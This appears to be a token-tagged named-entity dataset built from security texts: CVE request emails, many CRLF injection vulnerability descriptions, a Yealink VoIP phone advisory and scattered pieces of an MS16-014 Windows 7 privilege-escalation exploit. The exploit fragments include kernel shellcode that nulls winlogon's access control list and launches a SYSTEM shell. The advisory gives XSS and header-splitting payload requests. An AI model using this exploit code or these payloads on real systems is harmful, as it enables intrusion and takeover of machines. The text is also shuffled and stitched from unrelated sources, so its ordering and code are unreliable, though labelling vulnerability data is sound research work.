cve-assign O O
@ O O
... O O
re.org O O
To O O
: O O
Jason O O
@ O O
... O O
c4.com O O
Cc O O
: O O
cve-assign O O
@ O O
... O O
re.org O O
, O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
, O O
krzysztof.kowalewski O O
@ O O
... O O
t.pl O O
, O O
erik O O
@ O O
... O O
ludesecurity.com O O

There O O
is O O
no O O
CVE O O
ID O O
associated O O
with O O
this O O
report O O
, O O
which O O
seems O O
to O O
be O O
about O O
adding O O
new O O
security-related O O
functionality O O
. O O

A O O
malicious O O
user O O
could O O
provide O O
a O O
string O O
like O O
: O O
< O O
script O O
> O O
xss O O
< O O
/script O O
This O O
has O O
been O O
fixed O O
by O O
removing O O
support O O
for O O
the O O
mimetype O O
query O O
string O O
parameter O O
: O O
Use O O
CVE-2016-1899 O O
. O O

- O O
CVE O O
assignment O O
team O O
, O O
MITRE O O
CVE O O
Numbering O O
Authority O O
M/S O O
M300 O O
202 O O
Burlington O O
Road O O
, O O
Bedford O O
, O O
MA O O
01730 O O
USA O O
[ O O
PGP O O
key O O
available O O
through O O
] O O
BEGIN O O
PGP O O
SIGNATURE O O
Version O O
: O O
GnuPG O O
v1 O O
iQIcBAEBCAAGBQJWl9JtAAoJEL54rhJi8gl5lQEP/RNIfyGohJ7Z/SHub/OW/Bl0 O O
39LctMT9FcOTD6WBIvub4bWE6Q/c2FlWfDjeier2cO+pm3xJnXZEvGDMxZEI2wYI O O
ErO9spu++XX6JDak0Il9fdxPTTzjSJj+c+8O8fKI3mJyUVxNhmWYUxIdG83or9zx O O
ZUko+9LmXStUliIwG7FKGdqbP9gHvFI+ZLdfwtPomNJs9MEzJPipOEuSh6/Ia822 O O
4rXxn9Jb+wCVWdIhsaGUkuM4wq2SZsMcpJ13ww4IOOnCErfDKbRrODXvt03MRwyE O O
yE0R7aI0RoSzqzUAyiqJZZfgVgrPl1Ofx3n6mnbV3Y93Ypo8MparXUXf7+LDTT7I O O
Q9M7CWc5YYOnRBg12XFaUmJY25UQRlc4PjVUpX6DZY2vyzuO8cj3k64Vi4wcQ/Nc O O
OtyqNuKUJMPH77mVmMZHy7jfbtq/I20H34B57+jfBkCyLs50tQAP+8EAze0yEFF4 O O
ZXv87eMrUNJJu/qOoZeJaf57PAzuFaoANtYBQ+p/hUfMwsm8iGoy6Ko0ZXO3ZW3k O O
9kACdNt3QX0OfNVLws2r6qr+CFERrHMp+ha6JZbBFGAPNO4QP9ATzaixQzJ76nSU O O
pPrqObQ6H58Mmq+ACRtBTNLVnccMNLsMDPgSWeLmlXZpe5DP/EPyQuSduC7gDkB O O
8Td7FtAmzPUi1aORc6OK O O
=F6i1 O O
END O O
PGP O O
SIGNATURE O O

We O O
realize O O
that O O
other O O
perspectives O O
may O O
have O O
existed O O
, O O
especially O O
because O O
the O O
attacker O O
for O O
both O O
2 O O
and O O
3 O O
is O O
A O O
user O O
who O O
has O O
write O O
access O O
to O O
the O O
git O O
repository O O
. O O

Additionally O O
, O O
while O O
the O O
redirect O O
for O O
the O O
/about O O
- O O
/about O O
page O O
does O O
not O O
appear O O
to O O
be O O
vulnerable O O
due O O
to O O
mitigating O O
conditions O O
, O O
the O O
following O O
commit O O
was O O
made O O
to O O
similarly O O
harden O O
potential O O
injections O O
here O O
: O O
There O O
is O O
no O O
CVE O O
ID O O
associated O O
with O O
this O O
additional O O
issue O O
. O O

This O O
has O O
been O O
fixed O O
by O O
this O O
commit O O
: O O
Use O O
CVE-2016-1901 O O
. O O

Also O O
, O O
it O O
seems O O
that O O
another O O
possibility O O
may O O
have O O
been O O
creation O O
of O O
a O O
framework O O
for O O
segregating O O
the O O
user-uploaded O O
HTML O O
files O O
into O O
a O O
different O O
origin O O
( O O
admittedly O O
this O O
may O O
not O O
be O O
worthwhile O O
because O O
running O O
a O O
cgit O O
service O O
with O O
two O O
domain O O
names O O
probably O O
isn O O
t O O
what O O
the O O
ordinary O O
cgit O O
customer O O
wants O O
) O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
: O O
CGit O O
- O O
Multiple O O
vulnerabilities O O

CRLF O O
injection O O
vulnerability O O
in O O
EMC S-vulnerable_software pair_0
RSA S-vulnerable_software pair_0
Authentication S-vulnerable_software pair_0
Manager S-vulnerable_software pair_0
before S-vulnerable_version pair_0
8.1 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
P14 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
CLI O O
command O O
documentation O O
in O O
Jenkins S-vulnerable_software pair_0
before S-vulnerable_version pair_0
1.650 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
LTS S-vulnerable_version pair_0
before S-vulnerable_version pair_0
1.642.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
IBM S-vulnerable_software pair_0
WebSphere S-vulnerable_software pair_0
eXtreme S-vulnerable_software pair_0
Scale S-vulnerable_software pair_0
7.1.0 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
7.1.0.3 S-vulnerable_version pair_0
, O O
7.1.1 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
7.1.1.1 S-vulnerable_version pair_0
, O O
8.5 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
8.5.0.3 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
8.6 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
8.6.0.8 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
a O O
crafted O O
URL O O
. O O

Exploit O O
Title O O
: O O
Elevation O O
of O O
privilege O O
on O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
x86 O O
Date O O
: O O
28/06-2016 O O
Exploit O O
Author O O
: O O
@ O O
blomster81 O O

Overwrites O O
HaliSystemQueryInformation O O
, O O
but O O
does O O
not O O
replace O O
it O O
, O O
so O O
BSOD O O
will O O
occur O O
at O O
some O O
point O O
EDB O O
Note O O
ntos.h O O
is O O
available O O
here O O
: O O
stdafx.h O O
include O O
< O O
Windows.h O O
include O O
< O O
winioctl.h O O
include O O
ntos.h O O
include O O
< O O
TlHelp32.h O O
typedef O O
union O O
{ O O
HANDLE O O
Handle O O
; O O
ULONG64 O O
Handle64 O O
; O O
ULONG32 O O
Handle32 O O
; O O
} O O
HANDLE3264 O O
, O O
PHANDLE3264 O O
; O O
typedef O O
struct O O
{ O O
ULONG O O
HandleCount O O
; O O
ULONG O O
Action O O
; O O
HANDLE O O
PUSER_THREAD_START_ROUTINE O O
UserModeCallback O O
; O O
HANDLE3264 O O
UserModeProcess O O
; O O
HANDLE3264 O O
Handles O O
[ O O
20 O O
] O O
; O O
} O O
WMIRECEIVENOTIFICATION O O
, O O
PWMIRECEIVENOTIFICATION O O
; O O
define O O
RECEIVE_ACTION_CREATE_THREAD O O
2 O O
Mark O O
guid O O
objects O O
as O O
requiring O O
typedef O O
struct O O
{ O O
IN O O
VOID O O
ObjectAttributes O O
; O O
IN O O
ACCESS_MASK O O
DesiredAccess O O
; O O
OUT O O
HANDLE3264 O O
Handle O O
; O O
} O O
WMIOPENGUIDBLOCK O O
, O O
PWMIOPENGUIDBLOCK O O
; O O
typedef O O
enum O O
_KPROFILE_SOURCE O O
{ O O
ProfileTime O O
, O O
ProfileAlignmentFixup O O
, O O
ProfileTotalIssues O O
, O O
ProfilePipelineDry O O
, O O
ProfileLoadInstructions O O
, O O
ProfilePipelineFrozen O O
, O O
ProfileBranchInstructions O O
, O O
ProfileTotalNonissues O O
, O O
ProfileDcacheMisses O O
, O O
ProfileIcacheMisses O O
, O O
ProfileCacheMisses O O
, O O
ProfileBranchMispredictions O O
, O O
ProfileStoreInstructions O O
, O O
ProfileFpInstructions O O
, O O
ProfileIntegerInstructions O O
, O O
Profile2Issue O O
, O O
Profile3Issue O O
, O O
Profile4Issue O O
, O O
ProfileSpecialInstructions O O
, O O
ProfileTotalCycles O O
, O O
ProfileIcacheIssues O O
, O O
ProfileDcacheAccesses O O
, O O
ProfileMemoryBarrierCycles O O
, O O
ProfileLoadLinkedIssues O O
, O O
ProfileMaximum O O
} O O
KPROFILE_SOURCE O O
, O O
PKPROFILE_SOURCE O O
; O O
typedef O O
struct O O
_DESKTOPINFO O O
{ O O
000 O O
PVOID O O
pvDesktopBase O O
; O O
008 O O
PVOID O O
pvDesktopLimit O O
; O O
} O O
DESKTOPINFO O O
, O O
PDESKTOPINFO O O
; O O
typedef O O
struct O O
_CLIENTINFO O O
{ O O
000 O O
DWORD O O
CI_flags O O
; O O
004 O O
DWORD O O
cSpins O O
; O O
008 O O
DWORD O O
dwExpWinVer O O
; O O

Vendor O O
Homepage O O
: O O
Version O O
: O O
Windows O O
7 O O
SP1 O O
x86 O O

Check O O
this O O
mov O O
eax O O
, O O
[ O O
eax O O
+ O O
8 O O
] O O
THREADINFO O O
mov O O
eax O O
, O O
[ O O
eax O O
] O O
ETHREAD O O
mov O O
eax O O
, O O
[ O O
eax O O
+ O O
0x150 O O
] O O
KPROCESS O O
mov O O
eax O O
, O O
[ O O
eax O O
+ O O
0xb8 O O
] O O
flink O O
procloop O O
: O O
lea O O
edx O O
, O O
[ O O
eax O O
- O O
0xb8 O O
] O O
KPROCESS O O
mov O O
eax O O
, O O
[ O O
eax O O
] O O
add O O
edx O O
, O O
0x16c O O
module O O
name O O
cmp O O
dword O O
ptr O O
[ O O
edx O O
] O O
, O O
0x6c6e6977 O O
xef O O
xbf O O
xbdwinl O O
xef O O
xbf O O
xbd O O
for O O
winlogon.exe O O
jne O O
procloop O O
sub O O
edx O O
, O O
0x170 O O
mov O O
dword O O
ptr O O
[ O O
edx O O
] O O
, O O
0x0 O O
NULL O O
ACL O O
ret O O
} O O
} O O
int O O
main O O
( O O
) O O
{ O O
DWORD O O
dwBytesReturned O O
; O O
HANDLE O O
threadhandle O O
; O O
WMIRECEIVENOTIFICATION O O
buffer O O
; O O
CHAR O O
OutPut O O
[ O O
1000 O O
] O O
; O O
if O O
( O O
! O O
setup O O
( O O
) O O
) O O
{ O O
printf O O
( O O
Could O O
not O O
setup O O
window O O
) O O
; O O
return O O
0 O O
; O O
} O O
PVOID O O
userSC O O
= O O
VirtualAlloc O O
( O O
( O O
VOID O O
) O O
0x2a000000 O O
, O O
0x1000 O O
, O O
MEM_COMMIT O O
| O O
MEM_RESERVE O O
, O O
PAGE_EXECUTE_READWRITE O O
) O O
; O O
kHandle O O
= O O
( O O
void O O
) O O
leakWndAddr O O
( O O
g_window O O
) O O
; O O
memset O O
( O O
userSC O O
, O O
0x41 O O
, O O
0x1000 O O
) O O
; O O
memcpy O O
( O O
userSC O O
, O O
Shellcode O O
, O O
0x40 O O
) O O
; O O
if O O
( O O
! O O
leakHal O O
( O O
) O O
) O O
{ O O
printf O O
( O O
Could O O
not O O
leak O O
Hal O O
) O O
; O O
return O O

Tested O O
on O O
: O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
x86 O O
CVE O O
: O O
2016-0400 O O
MS16-014 O O
EoP O O
PoC O O
created O O
from O O
CMD.exe O O
with O O
SYSTEM O O
rights O O
. O O

WMIDataDevice O O
, O O
GENERIC_READ O O
| O O
GENERIC_WRITE O O
, O O
0 O O
, O O
NULL O O
, O O
OPEN_EXISTING O O
, O O
FILE_ATTRIBUTE_NORMAL O O
, O O
NULL O O
) O O
; O O
if O O
( O O
hDriver O O
! O O
= O O
INVALID_HANDLE_VALUE O O
) O O
{ O O
SprayKernelStack O O
( O O
) O O
; O O
if O O
( O O
! O O
DeviceIoControl O O
( O O
hDriver O O
, O O
IOCTL_WMI_RECEIVE_NOTIFICATIONS O O
, O O
& O O
buffer O O
, O O
sizeof O O
( O O
buffer O O
) O O
, O O
& O O
OutPut O O
, O O
sizeof O O
( O O
OutPut O O
) O O
, O O
& O O
dwBytesReturned O O
, O O
NULL O O
) O O
) O O
{ O O
return O O
1 O O
NtQueryIntervalProfile O O
NtQueryIntervalProfile O O
= O O
( O O
_NtQueryIntervalProfile O O
) O O
GetProcAddress O O
( O O
GetModuleHandleA O O
( O O
NTDLL.DLL O O
) O O
, O O
NtQueryIntervalProfile O O
) O O
; O O
ULONG O O
result O O
; O O
KPROFILE_SOURCE O O
stProfile O O
= O O
ProfileTotalIssues O O
; O O
NtQueryIntervalProfile O O
( O O
stProfile O O
, O O
& O O
result O O
) O O
; O O
printf O O
( O O
SYSTEM O O
shell O O
comming O O
) O O
; O O
Launch O O
( O O
) O O
; O O
printf O O
( O O
All O O
done O O
, O O
exiting O O
) O O
; O O
return O O
0 O O
; O O
} O O

Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
( O O
x86 O O
) O O
- O O
Local O O
Privilege O O
Escalation O O
( O O
MS16-014 O O
) O O

CRLF O O
injection O O
vulnerability O O
in O O
IBM S-vulnerable_software pair_0
WebSphere S-vulnerable_software pair_0
Application S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
( O O
WAS S-vulnerable_software pair_0
) O O
7.0 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
7.0.0.43 S-vulnerable_version pair_0
, O O
8.0 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
8.0.0.13 S-vulnerable_version pair_0
, O O
8.5 S-vulnerable_version pair_0
Full S-vulnerable_version pair_0
before S-vulnerable_version pair_0
8.5.5.10 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
8.5 S-vulnerable_version pair_0
Liberty S-vulnerable_version pair_0
before S-vulnerable_version pair_0
Liberty S-vulnerable_version pair_0
Fix S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
16.0.0.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
a O O
crafted O O
URL O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Squid S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.1.1 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
a O O
crafted O O
header O O
in O O
a O O
response O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Cisco S-vulnerable_software pair_0
TelePresence S-vulnerable_software pair_0
TC S-vulnerable_software pair_0
6.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.3.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
7.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
7.3.3 S-vulnerable_version pair_0
on O O
Integrator O O
C O O
SX20 O O
devices O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
a O O
crafted O O
URL O O
, O O
aka O O
Bug O O
ID O O
CSCut79341 O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
IBM O O
Flex O O
System O O
EN6131 O O
40Gb O O
Ethernet O O
and O O
IB6131 S-vulnerable_software pair_0
40Gb S-vulnerable_software pair_0
Infiniband S-vulnerable_software pair_0
Switch S-vulnerable_software pair_0
firmware O O
before S-vulnerable_version pair_0
3.4.1110 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
and O O
resulting O O
web O O
cache O O
poisoning O O
or O O
cross-site O O
scripting O O
( O O
XSS O O
) O O
attacks O O
, O O
or O O
obtain O O
sensitive O O
information O O
via O O
multiple O O
unspecified O O
parameters O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
libcurl S-vulnerable_software pair_0
6.0 S-vulnerable_version pair_0
through S-vulnerable_version pair_0
7.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
7.40.0 S-vulnerable_version pair_0
, O O
when O O
using O O
an O O
HTTP O O
proxy O O
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
a O O
URL O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
Universal O O
Access O O
implementation O O
in O O
IBM S-vulnerable_software pair_0
Curam S-vulnerable_software pair_0
Social S-vulnerable_software pair_0
Program S-vulnerable_software pair_0
Management S-vulnerable_software pair_0
6.0 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
EP26 S-vulnerable_version pair_0
, O O
6.0.4 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.0.4.5 S-vulnerable_version pair_0
iFix007 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
6.0.5 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.0.5.5 S-vulnerable_version pair_0
iFix003 S-vulnerable_version pair_0
, O O
when O O
WebSphere O O
Application O O
Server O O
is O O
not O O
used O O
, O O
allows O O
remote O O
authenticated O O
users O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
an O O
unspecified O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Yealink S-vulnerable_software pair_0
VoIP S-vulnerable_software pair_0
Phones S-vulnerable_software pair_0
with O O
firmware O O
28.72.0.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
model O O
parameter O O
to O O
servlet O O
. O O

In O O
my O O
tests O O
, O O
I O O
have O O
used O O
javascript O O
, O O
redirects O O
, O O
and O O
even O O
an O O
entire O O
web O O
page O O
shoved O O
into O O
the O O
CRLF O O
vulnerable O O
inputs O O
. O O

The O O
XSS O O
vulnerability O O
GET O O
/servlet O O
jumpto=dsskey O O
& O O
model= O O
% O O
22 O O
% O O
20onmouseover O O
% O O
3dprompt O O
% O O
28 O O
1337 O O
% O O
29 O O
% O O
20badpuppy O O
% O O
3d O O
% O O
22 O O
& O O
p=login O O
& O O
q=loginForm O O
HTTP/1.1 O O
Typical O O
Cross O O
Site O O
Scripting O O
. O O

ADVISORY O O
CVE-2014-3427 O O
CRLF O O
Injection O O
in O O
Yealink O O
VoIP O O
Phones O O
CVE-2014-3428 O O
XSS O O
vulnerabilities O O
in O O
Yealink O O
VoIP O O
Phones O O
Date O O
published O O
: O O
06/12/2014 O O

Validated O O
on O O
Version O O
28.72.0.2 S-vulnerable_version pair_0
Hardware S-vulnerable_software pair_1
Version O O
28.2.0.128.0.0.0 S-vulnerable_version pair_1
CRLF O O
Injection O O
( O O
Header O O
Splitting O O
) O O
proof O O
of O O
concept O O
: O O
Request O O
GET O O
/servlet O O
linepage=1 O O
& O O
model= O O
% O O
0d O O
% O O
0a O O
% O O
20 O O
ANYTHING O O
I O O
WANT O O
GOES O O
HERE O O
& O O
p=dsskey O O
& O O
q=load O O
HTTP/1.1 O O
In O O
the O O
above O O
request O O
, O O
attackers O O
can O O
shove O O
in O O
code O O
, O O
webpages O O
, O O
etc O O
. O O

To O O
minimize O O
noise O O
read O O
more O O
at O O
: O O
III O O
. O O

BACKGROUND O O
Yealink O O
is O O
a O O
manufacturer O O
of O O
VoIP O O
and O O
Video O O
products O O
. O O

Vendor O O
Contacted O O
: O O
05/08/2014 O O
II O O
. O O

SOLUTION O O
Minimize O O
accessibility O O
to O O
the O O
phone O O
interface O O
. O O

Crickets O O
06/12/2014 O O
Advisory O O
VI O O
. O O

TOOLS O O
USED O O
Burpsuite O O
, O O
WVS O O
, O O
Firefox O O
J. O O
Oquendo O O
SGFA O O
, O O
SGFE O O
, O O
C|EH O O
, O O
CNDA O O
, O O
CHFI O O
, O O
OSCP O O
, O O
CPT O O
, O O
RWSP O O
, O O
GREM O O
Where O O
ignorance O O
is O O
our O O
master O O
, O O
there O O
is O O
no O O
possibility O O
of O O
real O O
peace O O
- O O
Dalai O O
Lama O O
42B0 O O
5A53 O O
6505 O O
6638 O O
44BB O O
3943 O O
2BF7 O O
D83F O O
210A O O
95AF O O

V. O O
VENDOR O O
CONTACT O O
AND O O
RESPONSE O O
05/08/2014 O O
E-mailed O O
security O O
( O O
at O O
) O O
yealink O O
( O O
dot O O
) O O
com O O
[ O O
email O O
concealed O O
] O O
( O O
bounced O O
) O O
05/08/2014 O O
Created O O
an O O
account O O
on O O
Yealink O O
forum O O
and O O
sent O O
message O O
( O O
no O O
response O O
for O O
weeks O O
) O O
05/26/2014 O O
Response O O
via O O
e-mail O O
from O O
Yealink O O
05/26/2014 O O
Replied O O
to O O
vendor O O
I O O
would O O
disclose O O
in O O
June O O
06/01/2014 O O
Reached O O
back O O
out O O
to O O
vendor O O
for O O
update O O
06/08/2014 O O
Reached O O
back O O
out O O
to O O
vendor O O
for O O
update O O
06/11/2014 O O
Rouched O O
out O O
one O O
last O O
time O O
... O O

DESCRIPTION O O
There O O
are O O
CRLF O O
Injection O O
and O O
XSS O O
vulnerabilities O O
in O O
Yealink O O
VoIP O O
telephones O O
. O O

CVE-2014-3427 O O
CRLF O O
Injection O O
and O O
CVE-2014-3428 O O
XSS O O
Injection O O
in O O
Yealink O O
VoIP O O
Phones O O

Multiple O O
CRLF O O
injection O O
vulnerabilities O O
in O O
the O O
Universal O O
Access O O
in O O
IBM S-vulnerable_software pair_0
Curam S-vulnerable_software pair_0
Social S-vulnerable_software pair_0
Program S-vulnerable_software pair_0
Management S-vulnerable_software pair_0
( O O
SPM S-vulnerable_software pair_0
) O O
6.0.5.5 S-vulnerable_version pair_0
, O O
when O O
WebSphere O O
Application O O
Server O O
is O O
not O O
used O O
, O O
allow O O
remote O O
authenticated O O
users O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
parameters O O
. O O

Multiple O O
CRLF O O
injection O O
vulnerabilities O O
in O O
IBM S-vulnerable_software pair_0
Curam S-vulnerable_software pair_0
Social S-vulnerable_software pair_0
Program S-vulnerable_software pair_0
Management S-vulnerable_software pair_0
5.2 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
through S-vulnerable_version pair_0
6.0.5.4 S-vulnerable_version pair_0
allow O O
remote O O
authenticated O O
users O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
parameters O O
to O O
custom O O
JSPs O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
FortiGuard S-vulnerable_software pair_0
FortiWeb S-vulnerable_software pair_0
before S-vulnerable_version pair_0
5.0.3 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
Web O O
Application O O
Enterprise O O
Console O O
in O O
IBM S-vulnerable_software pair_0
InfoSphere S-vulnerable_software pair_0
BigInsights S-vulnerable_software pair_0
1.1 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
2.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
2.1 S-vulnerable_version pair_0
FP2 S-vulnerable_version pair_0
allows O O
remote O O
authenticated O O
users O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Request S-vulnerable_software pair_0
Tracker S-vulnerable_software pair_0
( O O
RT S-vulnerable_software pair_0
) O O
3.8.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
3.8.17 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.0.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.0.13 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
a O O
MIME O O
header O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
help/help_language.php O O
in O O
WebCollab S-vulnerable_software pair_0
3.30 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
item O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Jenkins S-vulnerable_software pair_0
before S-vulnerable_version pair_0
1.491 S-vulnerable_version pair_0
, O O
Jenkins S-vulnerable_software pair_1
LTS S-vulnerable_version pair_1
before S-vulnerable_version pair_1
1.480.1 S-vulnerable_version pair_1
, O O
and O O
Jenkins S-vulnerable_software pair_2
Enterprise S-vulnerable_version pair_2
1.424.x S-vulnerable_version pair_2
before S-vulnerable_version pair_2
1.424.6.13 S-vulnerable_version pair_2
, O O
1.447.x S-vulnerable_version pair_2
before S-vulnerable_version pair_2
1.447.4.1 S-vulnerable_version pair_2
, O O
and S-vulnerable_version pair_2
1.466.x S-vulnerable_version pair_2
before S-vulnerable_version pair_2
1.466.10.1 S-vulnerable_version pair_2
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
ownCloud S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.0.8 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
url O O
path O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Pebble S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2.6.4 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
cryptographp.inc.php O O
in O O
Cryptographp O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
cfg O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
tornado.web.RequestHandler.set_header O O
function O O
in O O
Tornado S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2.2.1 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
crafted O O
input O O
. O O

) O O
, O O
by O O
providing O O
a O O
specially-crafted O O
input O O
a O O
remote O O
attacker O O
could O O
use O O
this O O
flaw O O
to O O
perform O O
cross-site O O
scripting O O
attacks O O
, O O
cross-user O O
defacement O O
, O O
web O O
cache O O
poisoning O O
etc O O
. O O

Upstream O O
v2.2.1 O O
release O O
changelog O O
: O O
References O O
: O O
Could O O
you O O
allocate O O
a O O
CVE O O
id O O
for O O
this O O

Date O O
: O O
Fri O O
, O O
18 O O
May O O
2012 O O
11:40:56 O O
-0600 O O
From O O
: O O
Kurt O O
Seifried O O
< O O
kseifried O O
@ O O
... O O
hat.com O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
CC O O
: O O
Jan O O
Lieskovsky O O
< O O
jlieskov O O
@ O O
... O O
hat.com O O
> O O
, O O
Steven O O
M. O O
Christey O O
< O O
coley O O
@ O O
... O O
us.mitre.org O O

If O O
an O O
application O O
using O O
the O O
Tornado O O
web O O
framework O O
accepted O O
untrusted O O
user O O
input O O
and O O
based O O
on O O
that O O
input O O
updated O O
the O O
HTTP O O
headers O O
content O O
( O O
to O O
redirect O O
the O O
user O O
etc O O
. O O

- O O
Kurt O O
Seifried O O
Red O O
Hat O O
Security O O
Response O O
Team O O
( O O
SRT O O
) O O
PGP O O
: O O
0x5E267993 O O
A90B O O
F995 O O
7350 O O
148F O O
66BF O O
7554 O O
160D O O
4553 O O
5E26 O O
7993 O O
BEGIN O O
PGP O O
SIGNATURE O O
Version O O
: O O
GnuPG O O
v1.4.12 O O
( O O
GNU/Linux O O
) O O

Comment O O
: O O
Using O O
GnuPG O O
with O O
Mozilla O O
- O O
iQIcBAEBAgAGBQJPtomnAAoJEBYNRVNeJnmTt6QQAM5JUGGwQxV8LmGuKsFAUmN5 O O
yfcDxNhY9b1a8lMFBfnNuFG9dSf+DbuAYgbe3hqPiFlj6fWMofIXcsUxPoUEuTLf O O
